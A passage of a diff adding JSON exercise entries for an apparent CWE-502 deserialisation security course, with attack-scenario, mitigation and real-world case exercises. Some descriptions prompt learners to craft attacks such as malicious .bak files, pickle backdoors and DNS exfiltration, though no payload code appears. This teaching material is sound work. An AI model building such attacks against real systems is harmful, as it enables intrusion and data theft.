+          "starter_code": "// Predict the Damage: Root vs User\n// Given a pickle RCE on a server, list what an attacker can do as root vs limited user.\n\n// TODO: Complete this exercise\n// Think about:\n// 1. What is the normal operation?\n// 2. How does the attack exploit serialisation?\n// 3. What is the CIA impact?",
+          "expected_output": "Successfully demonstrated: Predict the Damage: Root vs User",
+          "hints": [
+            {
+              "message": "Start by understanding the normal operation before the attack. What does the application do legitimately?"
+            },
+            {
+              "message": "Think about what an attacker controls: the serialised bytes. How can they modify them to change the application's behaviour?"
+            },
+            {
+              "message": "The key CWE is 502 (Deserialization of Untrusted Data). The attack works because the deserialiser trusts the bytes without validation."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_33",
+          "title": "Exercise 33: Identify Vulnerable Code",
+          "description": "Review 5 code snippets and mark which ones have CWE-502 vulnerabilities.",
+          "difficulty": "intermediate",
+          "category": "Attack Scenarios",
+          "estimated_minutes": 5,
+          "ai_intro": "Time to think like an attacker! Understanding attacks helps you build better defences. Review 5 code snippets and mark which ones have CWE-502 vulnerabilities.",
+          "starter_code": "// Identify Vulnerable Code\n// Review 5 code snippets and mark which ones have CWE-502 vulnerabilities.\n\n// TODO: Complete this exercise\n// Think about:\n// 1. What is the normal operation?\n// 2. How does the attack exploit serialisation?\n// 3. What is the CIA impact?",
+          "expected_output": "Successfully demonstrated: Identify Vulnerable Code",
+          "hints": [
+            {
+              "message": "Start by understanding the normal operation before the attack. What does the application do legitimately?"
+            },
+            {
+              "message": "Think about what an attacker controls: the serialised bytes. How can they modify them to change the application's behaviour?"
+            },
+            {
+              "message": "The key CWE is 502 (Deserialization of Untrusted Data). The attack works because the deserialiser trusts the bytes without validation."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_34",
+          "title": "Exercise 34: Exploit Java Gadget Chains",
+          "description": "Explain how attackers chain library classes (Commons Collections) for Java RCE.",
+          "difficulty": "advanced",
+          "category": "Attack Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "Time to think like an attacker! Understanding attacks helps you build better defences. Explain how attackers chain library classes (Commons Collections) for Java RCE.",
+          "starter_code": "// Exploit Java Gadget Chains\n// Explain how attackers chain library classes (Commons Collections) for Java RCE.\n\n// TODO: Complete this exercise\n// Think about:\n// 1. What is the normal operation?\n// 2. How does the attack exploit serialisation?\n// 3. What is the CIA impact?",
+          "expected_output": "Successfully demonstrated: Exploit Java Gadget Chains",
+          "hints": [
+            {
+              "message": "Start by understanding the normal operation before the attack. What does the application do legitimately?"
+            },
+            {
+              "message": "Think about what an attacker controls: the serialised bytes. How can they modify them to change the application's behaviour?"
+            },
+            {
+              "message": "The key CWE is 502 (Deserialization of Untrusted Data). The attack works because the deserialiser trusts the bytes without validation."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_35",
+          "title": "Exercise 35: Session Object Manipulation",
+          "description": "A server stores session state in serialised Java objects. Show how to tamper with it.",
+          "difficulty": "advanced",
+          "category": "Attack Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "Time to think like an attacker! Understanding attacks helps you build better defences. A server stores session state in serialised Java objects. Show how to tamper with it.",
+          "starter_code": "// Session Object Manipulation\n// A server stores session state in serialised Java objects. Show how to tamper with it.\n\n// TODO: Complete this exercise\n// Think about:\n// 1. What is the normal operation?\n// 2. How does the attack exploit serialisation?\n// 3. What is the CIA impact?",
+          "expected_output": "Successfully demonstrated: Session Object Manipulation",
+          "hints": [
+            {
+              "message": "Start by understanding the normal operation before the attack. What does the application do legitimately?"
+            },
+            {
+              "message": "Think about what an attacker controls: the serialised bytes. How can they modify them to change the application's behaviour?"
+            },
+            {
+              "message": "The key CWE is 502 (Deserialization of Untrusted Data). The attack works because the deserialiser trusts the bytes without validation."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_36",
+          "title": "Exercise 36: File Format Attack",
+          "description": "A backup tool reads .bak files using ObjectInputStream. Create a malicious .bak file.",
+          "difficulty": "advanced",
+          "category": "Attack Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "Time to think like an attacker! Understanding attacks helps you build better defences. A backup tool reads .bak files using ObjectInputStream. Create a malicious .bak file.",
+          "starter_code": "// File Format Attack\n// A backup tool reads .bak files using ObjectInputStream. Create a malicious .bak file.\n\n// TODO: Complete this exercise\n// Think about:\n// 1. What is the normal operation?\n// 2. How does the attack exploit serialisation?\n// 3. What is the CIA impact?",
+          "expected_output": "Successfully demonstrated: File Format Attack",
+          "hints": [
+            {
+              "message": "Start by understanding the normal operation before the attack. What does the application do legitimately?"
+            },
+            {
+              "message": "Think about what an attacker controls: the serialised bytes. How can they modify them to change the application's behaviour?"
+            },
+            {
+              "message": "The key CWE is 502 (Deserialization of Untrusted Data). The attack works because the deserialiser trusts the bytes without validation."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_37",
+          "title": "Exercise 37: API Endpoint Exploitation",
+          "description": "An API accepts 'application/x-java-serialized-object'. Show why this is dangerous.",
+          "difficulty": "intermediate",
+          "category": "Attack Scenarios",
+          "estimated_minutes": 5,
+          "ai_intro": "Time to think like an attacker! Understanding attacks helps you build better defences. An API accepts 'application/x-java-serialized-object'. Show why this is dangerous.",
+          "starter_code": "// API Endpoint Exploitation\n// An API accepts 'application/x-java-serialized-object'. Show why this is dangerous.\n\n// TODO: Complete this exercise\n// Think about:\n// 1. What is the normal operation?\n// 2. How does the attack exploit serialisation?\n// 3. What is the CIA impact?",
+          "expected_output": "Successfully demonstrated: API Endpoint Exploitation",
+          "hints": [
+            {
+              "message": "Start by understanding the normal operation before the attack. What does the application do legitimately?"
+            },
+            {
+              "message": "Think about what an attacker controls: the serialised bytes. How can they modify them to change the application's behaviour?"
+            },
+            {
+              "message": "The key CWE is 502 (Deserialization of Untrusted Data). The attack works because the deserialiser trusts the bytes without validation."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_38",
+          "title": "Exercise 38: Pickle in Machine Learning",
+          "description": "ML models saved with pickle can contain backdoors. Show how.",
+          "difficulty": "advanced",
+          "category": "Attack Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "Time to think like an attacker! Understanding attacks helps you build better defences. ML models saved with pickle can contain backdoors. Show how.",
+          "starter_code": "// Pickle in Machine Learning\n// ML models saved with pickle can contain backdoors. Show how.\n\n// TODO: Complete this exercise\n// Think about:\n// 1. What is the normal operation?\n// 2. How does the attack exploit serialisation?\n// 3. What is the CIA impact?",
+          "expected_output": "Successfully demonstrated: Pickle in Machine Learning",
+          "hints": [
+            {
+              "message": "Start by understanding the normal operation before the attack. What does the application do legitimately?"
+            },
+            {
+              "message": "Think about what an attacker controls: the serialised bytes. How can they modify them to change the application's behaviour?"
+            },
+            {
+              "message": "The key CWE is 502 (Deserialization of Untrusted Data). The attack works because the deserialiser trusts the bytes without validation."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_39",
+          "title": "Exercise 39: DNS Exfiltration via Pickle",
+          "description": "Craft a pickle payload that exfiltrates data via DNS queries (concept only).",
+          "difficulty": "advanced",
+          "category": "Attack Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "Time to think like an attacker! Understanding attacks helps you build better defences. Craft a pickle payload that exfiltrates data via DNS queries (concept only).",
+          "starter_code": "// DNS Exfiltration via Pickle\n// Craft a pickle payload that exfiltrates data via DNS queries (concept only).\n\n// TODO: Complete this exercise\n// Think about:\n// 1. What is the normal operation?\n// 2. How does the attack exploit serialisation?\n// 3. What is the CIA impact?",
+          "expected_output": "Successfully demonstrated: DNS Exfiltration via Pickle",
+          "hints": [
+            {
+              "message": "Start by understanding the normal operation before the attack. What does the application do legitimately?"
+            },
+            {
+              "message": "Think about what an attacker controls: the serialised bytes. How can they modify them to change the application's behaviour?"
+            },
+            {
+              "message": "The key CWE is 502 (Deserialization of Untrusted Data). The attack works because the deserialiser trusts the bytes without validation."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_40",
+          "title": "Exercise 40: Timing Attack on Deserialisation",
+          "description": "Use timing differences to detect whether a server deserialises untrusted data.",
+          "difficulty": "intermediate",
+          "category": "Attack Scenarios",
+          "estimated_minutes": 5,
+          "ai_intro": "Time to think like an attacker! Understanding attacks helps you build better defences. Use timing differences to detect whether a server deserialises untrusted data.",
+          "starter_code": "// Timing Attack on Deserialisation\n// Use timing differences to detect whether a server deserialises untrusted data.\n\n// TODO: Complete this exercise\n// Think about:\n// 1. What is the normal operation?\n// 2. How does the attack exploit serialisation?\n// 3. What is the CIA impact?",
+          "expected_output": "Successfully demonstrated: Timing Attack on Deserialisation",
+          "hints": [
+            {
+              "message": "Start by understanding the normal operation before the attack. What does the application do legitimately?"
+            },
+            {
+              "message": "Think about what an attacker controls: the serialised bytes. How can they modify them to change the application's behaviour?"
+            },
+            {
+              "message": "The key CWE is 502 (Deserialization of Untrusted Data). The attack works because the deserialiser trusts the bytes without validation."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_41",
+          "title": "Exercise 41: Implement ObjectInputFilter",
+          "description": "Create a Java ObjectInputFilter that only allows specific safe classes.",
+          "difficulty": "advanced",
+          "category": "Mitigation & Defence",
+          "estimated_minutes": 8,
+          "ai_intro": "Now let's DEFEND! Create a Java ObjectInputFilter that only allows specific safe classes. This is where you become a security engineer.",
+          "starter_code": "// Implement ObjectInputFilter\n// Create a Java ObjectInputFilter that only allows specific safe classes.\n\n// TODO: Implement the mitigation\n// Remember:\n// 1. Follow CWE-502 guidance\n// 2. Apply defence in depth\n// 3. Test with both normal and malicious inputs",
+          "expected_output": "Mitigation implemented: Implement ObjectInputFilter — attacks now fail, normal operation continues",
+          "hints": [
+            {
+              "message": "Start with the simplest effective mitigation. What is the FIRST thing you should check?"
+            },
+            {
+              "message": "Think defence in depth: even if one layer fails, the next should catch the attack. What additional layers can you add?"
+            },
+            {
+              "message": "Test your mitigation with: (1) normal valid input, (2) known attack payload, (3) edge cases like empty input or very large data."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_42",
+          "title": "Exercise 42: Build RestrictedUnpickler",
+          "description": "Implement Python's RestrictedUnpickler with a whitelist of safe modules.",
+          "difficulty": "advanced",
+          "category": "Mitigation & Defence",
+          "estimated_minutes": 8,
+          "ai_intro": "Now let's DEFEND! Implement Python's RestrictedUnpickler with a whitelist of safe modules. This is where you become a security engineer.",
+          "starter_code": "// Build RestrictedUnpickler\n// Implement Python's RestrictedUnpickler with a whitelist of safe modules.\n\n// TODO: Implement the mitigation\n// Remember:\n// 1. Follow CWE-502 guidance\n// 2. Apply defence in depth\n// 3. Test with both normal and malicious inputs",
+          "expected_output": "Mitigation implemented: Build RestrictedUnpickler — attacks now fail, normal operation continues",
+          "hints": [
+            {
+              "message": "Start with the simplest effective mitigation. What is the FIRST thing you should check?"
+            },
+            {
+              "message": "Think defence in depth: even if one layer fails, the next should catch the attack. What additional layers can you add?"
+            },
+            {
+              "message": "Test your mitigation with: (1) normal valid input, (2) known attack payload, (3) edge cases like empty input or very large data."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_43",
+          "title": "Exercise 43: Add HMAC Signing",
+          "description": "Sign serialised data with HMAC-SHA256 and verify before deserialising.",
+          "difficulty": "advanced",
+          "category": "Mitigation & Defence",
+          "estimated_minutes": 8,
+          "ai_intro": "Now let's DEFEND! Sign serialised data with HMAC-SHA256 and verify before deserialising. This is where you become a security engineer.",
+          "starter_code": "// Add HMAC Signing\n// Sign serialised data with HMAC-SHA256 and verify before deserialising.\n\n// TODO: Implement the mitigation\n// Remember:\n// 1. Follow CWE-502 guidance\n// 2. Apply defence in depth\n// 3. Test with both normal and malicious inputs",
+          "expected_output": "Mitigation implemented: Add HMAC Signing — attacks now fail, normal operation continues",
+          "hints": [
+            {
+              "message": "Start with the simplest effective mitigation. What is the FIRST thing you should check?"
+            },
+            {
+              "message": "Think defence in depth: even if one layer fails, the next should catch the attack. What additional layers can you add?"
+            },
+            {
+              "message": "Test your mitigation with: (1) normal valid input, (2) known attack payload, (3) edge cases like empty input or very large data."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_44",
+          "title": "Exercise 44: Replace pickle with JSON",
+          "description": "Refactor a pickle-based client-server to use JSON instead.",
+          "difficulty": "intermediate",
+          "category": "Mitigation & Defence",
+          "estimated_minutes": 5,
+          "ai_intro": "Now let's DEFEND! Refactor a pickle-based client-server to use JSON instead. This is where you become a security engineer.",
+          "starter_code": "// Replace pickle with JSON\n// Refactor a pickle-based client-server to use JSON instead.\n\n// TODO: Implement the mitigation\n// Remember:\n// 1. Follow CWE-502 guidance\n// 2. Apply defence in depth\n// 3. Test with both normal and malicious inputs",
+          "expected_output": "Mitigation implemented: Replace pickle with JSON — attacks now fail, normal operation continues",
+          "hints": [
+            {
+              "message": "Start with the simplest effective mitigation. What is the FIRST thing you should check?"
+            },
+            {
+              "message": "Think defence in depth: even if one layer fails, the next should catch the attack. What additional layers can you add?"
+            },
+            {
+              "message": "Test your mitigation with: (1) normal valid input, (2) known attack payload, (3) edge cases like empty input or very large data."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_45",
+          "title": "Exercise 45: Implement Input Validation",
+          "description": "Add comprehensive validation to deserialised JSON data (types, ranges, required fields).",
+          "difficulty": "intermediate",
+          "category": "Mitigation & Defence",
+          "estimated_minutes": 5,
+          "ai_intro": "Now let's DEFEND! Add comprehensive validation to deserialised JSON data (types, ranges, required fields). This is where you become a security engineer.",
+          "starter_code": "// Implement Input Validation\n// Add comprehensive validation to deserialised JSON data (types, ranges, required fields).\n\n// TODO: Implement the mitigation\n// Remember:\n// 1. Follow CWE-502 guidance\n// 2. Apply defence in depth\n// 3. Test with both normal and malicious inputs",
+          "expected_output": "Mitigation implemented: Implement Input Validation — attacks now fail, normal operation continues",
+          "hints": [
+            {
+              "message": "Start with the simplest effective mitigation. What is the FIRST thing you should check?"
+            },
+            {
+              "message": "Think defence in depth: even if one layer fails, the next should catch the attack. What additional layers can you add?"
+            },
+            {
+              "message": "Test your mitigation with: (1) normal valid input, (2) known attack payload, (3) edge cases like empty input or very large data."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_46",
+          "title": "Exercise 46: Defence in Depth Architecture",
+          "description": "Design a 5-layer defence system for an application that must handle serialised data.",
+          "difficulty": "advanced",
+          "category": "Mitigation & Defence",
+          "estimated_minutes": 8,
+          "ai_intro": "Now let's DEFEND! Design a 5-layer defence system for an application that must handle serialised data. This is where you become a security engineer.",
+          "starter_code": "// Defence in Depth Architecture\n// Design a 5-layer defence system for an application that must handle serialised data.\n\n// TODO: Implement the mitigation\n// Remember:\n// 1. Follow CWE-502 guidance\n// 2. Apply defence in depth\n// 3. Test with both normal and malicious inputs",
+          "expected_output": "Mitigation implemented: Defence in Depth Architecture — attacks now fail, normal operation continues",
+          "hints": [
+            {
+              "message": "Start with the simplest effective mitigation. What is the FIRST thing you should check?"
+            },
+            {
+              "message": "Think defence in depth: even if one layer fails, the next should catch the attack. What additional layers can you add?"
+            },
+            {
+              "message": "Test your mitigation with: (1) normal valid input, (2) known attack payload, (3) edge cases like empty input or very large data."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_47",
+          "title": "Exercise 47: Secure the Server.py",
+          "description": "Fix the vulnerable server.py by adding RestrictedUnpickler.",
+          "difficulty": "intermediate",
+          "category": "Mitigation & Defence",
+          "estimated_minutes": 5,
+          "ai_intro": "Now let's DEFEND! Fix the vulnerable server.py by adding RestrictedUnpickler. This is where you become a security engineer.",
+          "starter_code": "// Secure the Server.py\n// Fix the vulnerable server.py by adding RestrictedUnpickler.\n\n// TODO: Implement the mitigation\n// Remember:\n// 1. Follow CWE-502 guidance\n// 2. Apply defence in depth\n// 3. Test with both normal and malicious inputs",
+          "expected_output": "Mitigation implemented: Secure the Server.py — attacks now fail, normal operation continues",
+          "hints": [
+            {
+              "message": "Start with the simplest effective mitigation. What is the FIRST thing you should check?"
+            },
+            {
+              "message": "Think defence in depth: even if one layer fails, the next should catch the attack. What additional layers can you add?"
+            },
+            {
+              "message": "Test your mitigation with: (1) normal valid input, (2) known attack payload, (3) edge cases like empty input or very large data."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_48",
+          "title": "Exercise 48: Content-Type Filtering",
+          "description": "Reject HTTP requests with dangerous Content-Types like application/x-java-serialized-object.",
+          "difficulty": "intermediate",
+          "category": "Mitigation & Defence",
+          "estimated_minutes": 5,
+          "ai_intro": "Now let's DEFEND! Reject HTTP requests with dangerous Content-Types like application/x-java-serialized-object. This is where you become a security engineer.",
+          "starter_code": "// Content-Type Filtering\n// Reject HTTP requests with dangerous Content-Types like application/x-java-serialized-object.\n\n// TODO: Implement the mitigation\n// Remember:\n// 1. Follow CWE-502 guidance\n// 2. Apply defence in depth\n// 3. Test with both normal and malicious inputs",
+          "expected_output": "Mitigation implemented: Content-Type Filtering — attacks now fail, normal operation continues",
+          "hints": [
+            {
+              "message": "Start with the simplest effective mitigation. What is the FIRST thing you should check?"
+            },
+            {
+              "message": "Think defence in depth: even if one layer fails, the next should catch the attack. What additional layers can you add?"
+            },
+            {
+              "message": "Test your mitigation with: (1) normal valid input, (2) known attack payload, (3) edge cases like empty input or very large data."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_49",
+          "title": "Exercise 49: Implement readResolve for Singletons",
+          "description": "Prevent singleton cloning via serialisation using readResolve().",
+          "difficulty": "intermediate",
+          "category": "Mitigation & Defence",
+          "estimated_minutes": 5,
+          "ai_intro": "Now let's DEFEND! Prevent singleton cloning via serialisation using readResolve(). This is where you become a security engineer.",
+          "starter_code": "// Implement readResolve for Singletons\n// Prevent singleton cloning via serialisation using readResolve().\n\n// TODO: Implement the mitigation\n// Remember:\n// 1. Follow CWE-502 guidance\n// 2. Apply defence in depth\n// 3. Test with both normal and malicious inputs",
+          "expected_output": "Mitigation implemented: Implement readResolve for Singletons — attacks now fail, normal operation continues",
+          "hints": [
+            {
+              "message": "Start with the simplest effective mitigation. What is the FIRST thing you should check?"
+            },
+            {
+              "message": "Think defence in depth: even if one layer fails, the next should catch the attack. What additional layers can you add?"
+            },
+            {
+              "message": "Test your mitigation with: (1) normal valid input, (2) known attack payload, (3) edge cases like empty input or very large data."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_50",
+          "title": "Exercise 50: Encrypt Serialised Data",
+          "description": "Add AES encryption layer to protect serialised data at rest.",
+          "difficulty": "advanced",
+          "category": "Mitigation & Defence",
+          "estimated_minutes": 8,
+          "ai_intro": "Now let's DEFEND! Add AES encryption layer to protect serialised data at rest. This is where you become a security engineer.",
+          "starter_code": "// Encrypt Serialised Data\n// Add AES encryption layer to protect serialised data at rest.\n\n// TODO: Implement the mitigation\n// Remember:\n// 1. Follow CWE-502 guidance\n// 2. Apply defence in depth\n// 3. Test with both normal and malicious inputs",
+          "expected_output": "Mitigation implemented: Encrypt Serialised Data — attacks now fail, normal operation continues",
+          "hints": [
+            {
+              "message": "Start with the simplest effective mitigation. What is the FIRST thing you should check?"
+            },
+            {
+              "message": "Think defence in depth: even if one layer fails, the next should catch the attack. What additional layers can you add?"
+            },
+            {
+              "message": "Test your mitigation with: (1) normal valid input, (2) known attack payload, (3) edge cases like empty input or very large data."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_51",
+          "title": "Exercise 51: Security Logging",
+          "description": "Add audit logging for all deserialisation attempts — both successful and blocked.",
+          "difficulty": "intermediate",
+          "category": "Mitigation & Defence",
+          "estimated_minutes": 5,
+          "ai_intro": "Now let's DEFEND! Add audit logging for all deserialisation attempts — both successful and blocked. This is where you become a security engineer.",
+          "starter_code": "// Security Logging\n// Add audit logging for all deserialisation attempts — both successful and blocked.\n\n// TODO: Implement the mitigation\n// Remember:\n// 1. Follow CWE-502 guidance\n// 2. Apply defence in depth\n// 3. Test with both normal and malicious inputs",
+          "expected_output": "Mitigation implemented: Security Logging — attacks now fail, normal operation continues",
+          "hints": [
+            {
+              "message": "Start with the simplest effective mitigation. What is the FIRST thing you should check?"
+            },
+            {
+              "message": "Think defence in depth: even if one layer fails, the next should catch the attack. What additional layers can you add?"
+            },
+            {
+              "message": "Test your mitigation with: (1) normal valid input, (2) known attack payload, (3) edge cases like empty input or very large data."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_52",
+          "title": "Exercise 52: Full Mitigation Review",
+          "description": "Given a vulnerable application, apply ALL mitigation strategies and verify the attacks fail.",
+          "difficulty": "advanced",
+          "category": "Mitigation & Defence",
+          "estimated_minutes": 8,
+          "ai_intro": "Now let's DEFEND! Given a vulnerable application, apply ALL mitigation strategies and verify the attacks fail. This is where you become a security engineer.",
+          "starter_code": "// Full Mitigation Review\n// Given a vulnerable application, apply ALL mitigation strategies and verify the attacks fail.\n\n// TODO: Implement the mitigation\n// Remember:\n// 1. Follow CWE-502 guidance\n// 2. Apply defence in depth\n// 3. Test with both normal and malicious inputs",
+          "expected_output": "Mitigation implemented: Full Mitigation Review — attacks now fail, normal operation continues",
+          "hints": [
+            {
+              "message": "Start with the simplest effective mitigation. What is the FIRST thing you should check?"
+            },
+            {
+              "message": "Think defence in depth: even if one layer fails, the next should catch the attack. What additional layers can you add?"
+            },
+            {
+              "message": "Test your mitigation with: (1) normal valid input, (2) known attack payload, (3) edge cases like empty input or very large data."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_53",
+          "title": "Exercise 53: Equifax Breach Analysis",
+          "description": "Analyse how unsafe deserialisation contributed to the 2017 Equifax breach exposing 147 million records.",
+          "difficulty": "intermediate",
+          "category": "Real-World Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "Let's apply what you've learned to the real world! Analyse how unsafe deserialisation contributed to the 2017 Equifax breach exposing 147 million records.",
+          "starter_code": "// Equifax Breach Analysis\n// Analyse how unsafe deserialisation contributed to the 2017 Equifax breach exposing 147 million records.\n\n// TODO: Complete this real-world scenario\n// Structure your answer:\n// 1. Normal Operation\n// 2. The Vulnerability\n// 3. The Attack\n// 4. CIA Impact\n// 5. Mitigation Strategy",
+          "expected_output": "Completed real-world analysis: Equifax Breach Analysis",
+          "hints": [
+            {
+              "message": "Think about the trust boundary: where does untrusted data enter the system?"
+            },
+            {
+              "message": "Apply the 'Normal → Attack → Mitigation' pattern. First explain what SHOULD happen, then what CAN go wrong."
+            },
+            {
+              "message": "Reference CWE-502 and OWASP A08:2021 in your analysis. Mention specific mitigation techniques."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_54",
+          "title": "Exercise 54: Log4Shell Connection",
+          "description": "Explain how Log4Shell (CVE-2021-44228) relates to deserialisation-style attacks via JNDI lookups.",
+          "difficulty": "advanced",
+          "category": "Real-World Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "Let's apply what you've learned to the real world! Explain how Log4Shell (CVE-2021-44228) relates to deserialisation-style attacks via JNDI lookups.",
+          "starter_code": "// Log4Shell Connection\n// Explain how Log4Shell (CVE-2021-44228) relates to deserialisation-style attacks via JNDI lookups.\n\n// TODO: Complete this real-world scenario\n// Structure your answer:\n// 1. Normal Operation\n// 2. The Vulnerability\n// 3. The Attack\n// 4. CIA Impact\n// 5. Mitigation Strategy",
+          "expected_output": "Completed real-world analysis: Log4Shell Connection",
+          "hints": [
+            {
+              "message": "Think about the trust boundary: where does untrusted data enter the system?"
+            },
+            {
+              "message": "Apply the 'Normal → Attack → Mitigation' pattern. First explain what SHOULD happen, then what CAN go wrong."
+            },
+            {
+              "message": "Reference CWE-502 and OWASP A08:2021 in your analysis. Mention specific mitigation techniques."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_55",
+          "title": "Exercise 55: Secure a Banking API",
+          "description": "A banking API receives transaction data. Design a secure data exchange format.",
+          "difficulty": "advanced",
+          "category": "Real-World Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "Let's apply what you've learned to the real world! A banking API receives transaction data. Design a secure data exchange format.",
+          "starter_code": "// Secure a Banking API\n// A banking API receives transaction data. Design a secure data exchange format.\n\n// TODO: Complete this real-world scenario\n// Structure your answer:\n// 1. Normal Operation\n// 2. The Vulnerability\n// 3. The Attack\n// 4. CIA Impact\n// 5. Mitigation Strategy",
+          "expected_output": "Completed real-world analysis: Secure a Banking API",
+          "hints": [
+            {
+              "message": "Think about the trust boundary: where does untrusted data enter the system?"
+            },
+            {
+              "message": "Apply the 'Normal → Attack → Mitigation' pattern. First explain what SHOULD happen, then what CAN go wrong."
+            },
+            {
+              "message": "Reference CWE-502 and OWASP A08:2021 in your analysis. Mention specific mitigation techniques."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_56",
+          "title": "Exercise 56: IoT Device Firmware Update",
+          "description": "An IoT device receives firmware updates as serialised objects. Identify the risks.",
+          "difficulty": "intermediate",
+          "category": "Real-World Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "Let's apply what you've learned to the real world! An IoT device receives firmware updates as serialised objects. Identify the risks.",
+          "starter_code": "// IoT Device Firmware Update\n// An IoT device receives firmware updates as serialised objects. Identify the risks.\n\n// TODO: Complete this real-world scenario\n// Structure your answer:\n// 1. Normal Operation\n// 2. The Vulnerability\n// 3. The Attack\n// 4. CIA Impact\n// 5. Mitigation Strategy",
+          "expected_output": "Completed real-world analysis: IoT Device Firmware Update",
+          "hints": [
+            {
+              "message": "Think about the trust boundary: where does untrusted data enter the system?"
+            },
+            {
+              "message": "Apply the 'Normal → Attack → Mitigation' pattern. First explain what SHOULD happen, then what CAN go wrong."
+            },
+            {
+              "message": "Reference CWE-502 and OWASP A08:2021 in your analysis. Mention specific mitigation techniques."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_57",
+          "title": "Exercise 57: Game Save File Security",
+          "description": "A multiplayer game uses serialised save files. How do you prevent cheating?",
+          "difficulty": "intermediate",
+          "category": "Real-World Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "Let's apply what you've learned to the real world! A multiplayer game uses serialised save files. How do you prevent cheating?",
+          "starter_code": "// Game Save File Security\n// A multiplayer game uses serialised save files. How do you prevent cheating?\n\n// TODO: Complete this real-world scenario\n// Structure your answer:\n// 1. Normal Operation\n// 2. The Vulnerability\n// 3. The Attack\n// 4. CIA Impact\n// 5. Mitigation Strategy",
+          "expected_output": "Completed real-world analysis: Game Save File Security",
+          "hints": [
+            {
+              "message": "Think about the trust boundary: where does untrusted data enter the system?"
+            },
+            {
+              "message": "Apply the 'Normal → Attack → Mitigation' pattern. First explain what SHOULD happen, then what CAN go wrong."
+            },
+            {
+              "message": "Reference CWE-502 and OWASP A08:2021 in your analysis. Mention specific mitigation techniques."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_58",
+          "title": "Exercise 58: Microservices Communication",
+          "description": "Two microservices exchange data. Compare: Java serialisation vs JSON vs Protocol Buffers.",
+          "difficulty": "intermediate",
+          "category": "Real-World Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "Let's apply what you've learned to the real world! Two microservices exchange data. Compare: Java serialisation vs JSON vs Protocol Buffers.",
+          "starter_code": "// Microservices Communication\n// Two microservices exchange data. Compare: Java serialisation vs JSON vs Protocol Buffers.\n\n// TODO: Complete this real-world scenario\n// Structure your answer:\n// 1. Normal Operation\n// 2. The Vulnerability\n// 3. The Attack\n// 4. CIA Impact\n// 5. Mitigation Strategy",
+          "expected_output": "Completed real-world analysis: Microservices Communication",
+          "hints": [
+            {
+              "message": "Think about the trust boundary: where does untrusted data enter the system?"
+            },
+            {
+              "message": "Apply the 'Normal → Attack → Mitigation' pattern. First explain what SHOULD happen, then what CAN go wrong."
+            },
+            {
+              "message": "Reference CWE-502 and OWASP A08:2021 in your analysis. Mention specific mitigation techniques."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_59",
+          "title": "Exercise 59: Security Audit Checklist",
+          "description": "Create a checklist for auditing an application for CWE-502 vulnerabilities.",
+          "difficulty": "intermediate",
+          "category": "Real-World Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "Let's apply what you've learned to the real world! Create a checklist for auditing an application for CWE-502 vulnerabilities.",
+          "starter_code": "// Security Audit Checklist\n// Create a checklist for auditing an application for CWE-502 vulnerabilities.\n\n// TODO: Complete this real-world scenario\n// Structure your answer:\n// 1. Normal Operation\n// 2. The Vulnerability\n// 3. The Attack\n// 4. CIA Impact\n// 5. Mitigation Strategy",
+          "expected_output": "Completed real-world analysis: Security Audit Checklist",
+          "hints": [
+            {
+              "message": "Think about the trust boundary: where does untrusted data enter the system?"
+            },
+            {
+              "message": "Apply the 'Normal → Attack → Mitigation' pattern. First explain what SHOULD happen, then what CAN go wrong."
+            },
+            {
+              "message": "Reference CWE-502 and OWASP A08:2021 in your analysis. Mention specific mitigation techniques."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_60",
+          "title": "Exercise 60: Write a CWE-502 Report",
+          "description": "Write a professional vulnerability report for a CWE-502 finding including normal operation, attack, and mitigation.",
+          "difficulty": "advanced",
+          "category": "Real-World Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "Let's apply what you've learned to the real world! Write a professional vulnerability report for a CWE-502 finding including normal operation, attack, and mitigation.",
+          "starter_code": "// Write a CWE-502 Report\n// Write a professional vulnerability report for a CWE-502 finding including normal operation, attack, and mitigation.\n\n// TODO: Complete this real-world scenario\n// Structure your answer:\n// 1. Normal Operation\n// 2. The Vulnerability\n// 3. The Attack\n// 4. CIA Impact\n// 5. Mitigation Strategy",
+          "expected_output": "Completed real-world analysis: Write a CWE-502 Report",
+          "hints": [
+            {
+              "message": "Think about the trust boundary: where does untrusted data enter the system?"
+            },
+            {
+              "message": "Apply the 'Normal → Attack → Mitigation' pattern. First explain what SHOULD happen, then what CAN go wrong."
+            },
+            {
+              "message": "Reference CWE-502 and OWASP A08:2021 in your analysis. Mention specific mitigation techniques."
+            }
